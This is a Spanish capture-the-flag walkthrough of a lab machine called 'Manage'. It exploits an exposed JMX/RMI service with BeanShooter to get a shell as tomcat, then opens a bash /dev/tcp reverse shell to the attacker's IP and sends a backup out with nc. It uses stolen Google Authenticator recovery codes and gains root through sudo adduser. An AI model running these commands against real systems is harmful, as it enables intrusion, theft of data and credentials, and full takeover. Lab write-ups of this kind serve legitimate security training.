---
banner: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9f776202-c45c-4eed-aa55-a261c0cbd386.png
---
# Manage

## 1. Enumeración

### Nmap

Comienzo con un escaneo de Nmap y encuentro tres puertos abiertos: OpenSSH en el puerto 22, un servidor web Apache Tomcat en el puerto 8080 y un servicio Java RMI en el puerto 2222.

```
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)
|_  256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
2222/tcp open  java-rmi Java RMI
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:41163
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
8080/tcp open  http     Apache Tomcat 10.1.19
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.1.19
```

|Puerto|Servicio|Versión|
|---|---|---|
|22|SSH|OpenSSH 8.9p1 Ubuntu|
|2222|Java RMI|jmxrmi|
|8080|HTTP|Apache Tomcat 10.1.19|

### Puerto 8080: Apache Tomcat

De acuerdo con la salida de Nmap, en el puerto 8080 corre un servicio HTTP. Al acceder desde el navegador solo se muestra la página por defecto de Apache Tomcat.

![[2026-11-04_21-07.png|617]]

Tras una revisión superficial no encuentro nada explotable en este servicio, por lo que centro el análisis en el servicio Java RMI del puerto 2222.

### Puerto 2222: Java RMI / JMX

Una enumeración más profunda con Nmap sobre este puerto arroja el siguiente resultado:

```
2222/tcp open  java-rmi Java RMI
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:41163
```

Este puerto expone un servicio Java RMI (Remote Method Invocation), un mecanismo que permite a objetos Java invocar métodos de manera remota sobre la red. Una configuración deficiente de este servicio puede derivar en ejecución remota de código.

En el registro RMI aparece expuesto el objeto `jmxrmi`, lo que indica la presencia de un endpoint JMX accesible.

- **JMX (Java Management Extensions):** API de Java orientada a la gestión y supervisión de aplicaciones y recursos. Permite acceder a objetos administrados conocidos como **MBeans** (Managed Beans), los cuales exponen atributos y operaciones para su administración remota o local. Es ampliamente utilizado para monitorización, configuración y gestión de aplicaciones Java en producción.

Para enumerar el endpoint utilizo **BeanShooter**, una herramienta diseñada específicamente para la enumeración y explotación de servicios JMX. Puede obtenerse clonando el repositorio desde GitHub y compilando con Maven, o descargando directamente el binario precompilado de la última release.

Con la versión **beanshooter-4.1.0-jar-with-dependencies.jar** ejecuto un escaneo de enumeración contra el objetivo:

```bash
java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222
```

El resultado confirma que el endpoint JMX es **vulnerable** y, al finalizar el escaneo, la herramienta revela dos credenciales: una para el usuario `manager` y otra para `admin`.

![[Pasted image 20261104212302.png]]

## 2. Explotación

Una de las funcionalidades más útiles de BeanShooter es la posibilidad de desplegar un MBean malicioso para obtener una shell interactiva. El proceso requiere dos pasos.

Primero, despliego el MBean `tonka` en modo estándar:

```bash
java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.234.57 2222 tonka
```

Luego, invoco el método de ejecución de comandos del MBean para obtener una shell:

```bash
java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222
```

![[Pasted image 20261104222034.png]]

Obtengo ejecución de comandos como el usuario de servicio **tomcat**. Localizo la flag de usuario en `/opt/tomcat/user.txt`.

![[Pasted image 20261104222645.png]]

## 3. Movimiento lateral

Con acceso como `tomcat`, reviso los privilegios disponibles y enumero los usuarios locales del sistema.

![[Pasted image 20261104230948.png]]

Dado que la shell obtenida mediante BeanShooter es inestable, establezco una reverse shell más estable desde la máquina objetivo:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.15/7777 0>&1'
```

![[Pasted image 20261104223234.png]]

Tras recibir la conexión, estabilizo la TTY y pruebo a reutilizar las credenciales obtenidas en la fase de enumeración. Estas corresponden al usuario **useradmin**, cuya cuenta tiene habilitada autenticación de dos factores (OTP), por lo que el acceso queda bloqueado sin el código correspondiente.

![[Pasted image 20261104223453.png]]

Al revisar los archivos propios de `useradmin`, identifico uno de interés y lo transfiero a mi máquina de ataque.

![[Pasted image 20261104223711.png]]

Para la transferencia, pongo mi máquina en escucha:

```bash
nc -lvp 1234 > backup.tar.gz
```

Y desde la víctima envío el archivo:

```bash
nc 10.10.15.15 1234 < backup.tar.gz
```

Una vez recibido, extraigo el contenido del archivo con `tar`:

```bash
tar -xvzf backup.tar.gz
```

![[Pasted image 20261104224201.png]]

Entre los archivos extraídos encuentro datos de configuración de `useradmin`. Al intentar autenticarme con la clave SSH, el sistema sigue solicitando el código OTP, por lo que reviso el archivo `.google_authenticator`, que contiene la semilla y los códigos de recuperación del segundo factor.

![[Pasted image 20261104224327.png]]

Con los códigos OTP recuperados, logro autenticarme exitosamente como `useradmin`.

## 4. Escalada de privilegios

Ya como `useradmin`, realizo una enumeración básica de privilegios.

![[Pasted image 20261104224532.png]]

La salida de `sudo -l` muestra que el usuario tiene permiso para ejecutar `adduser` como root sin contraseña, con el nombre de usuario restringido a caracteres alfanuméricos. Tras probar distintos vectores (crear una cuenta de sistema con `sudo /usr/sbin/adduser test --system`, inyectar caracteres de escape, entre otros) sin éxito, el análisis se centra en el archivo **sudoers**, ubicado en `/etc/sudoers`. Como no tengo permisos de lectura sobre él, reviso la configuración estándar que trae Ubuntu por defecto:

```
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty

# This preserves proxy settings from user environments of root
# equivalent users (group sudo)
#Defaults:%sudo env_keep += "http_proxy https_proxy ftp_proxy all_proxy no_proxy"

# This allows running arbitrary commands, but so does ALL, and it means
# different sudoers have their choice of editor respected.
#Defaults:%sudo env_keep += "EDITOR"

# Completely harmless preservation of a user preference.
#Defaults:%sudo env_keep += "GREP_COLOR"

# While you shouldn't normally run git as root, you need to with etckeeper
#Defaults:%sudo env_keep += "GIT_AUTHOR_* GIT_COMMITTER_*"

# Per-user preferences; root won't have sensible values for them.
#Defaults:%sudo env_keep += "EMAIL DEBEMAIL DEBFULLNAME"

# "sudo scp" or "sudo rsync" should be able to use your SSH agent.
#Defaults:%sudo env_keep += "SSH_AGENT_PID SSH_AUTH_SOCK"

# Ditto for GPG agent
#Defaults:%sudo env_keep += "GPG_AGENT_INFO"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d
```

La línea clave es `%admin ALL=(ALL) ALL`, que otorga privilegios `sudo` completos a cualquier miembro del grupo `admin`. En sistemas Ubuntu, este grupo existe por defecto pero normalmente no tiene usuarios asignados, y al crear un usuario llamado exactamente `admin`, el sistema lo agrega automáticamente a dicho grupo.

Verifico en `/etc/passwd` que ese usuario no existe todavía en el sistema, lo que confirma que el vector es viable. Aprovechando el permiso de `sudo` sobre `adduser`, creo un usuario llamado `admin` y le asigno una contraseña:

![[Pasted image 20261104225726.png]]

Como se observa en la salida, el nuevo usuario queda efectivamente asociado al grupo `admin`. A continuación, cambio a esa cuenta y confirmo que dispone de privilegios `sudo` completos.

![[Pasted image 20261104225752.png]]

Desde esta cuenta puedo ejecutar cualquier comando como root mediante `sudo`, o escalar directamente a una shell de root.

Con esto se completa el compromiso total de la máquina. La flag de root se encuentra en `/root/root.txt`.

![[Pasted image 20261104225907.png]]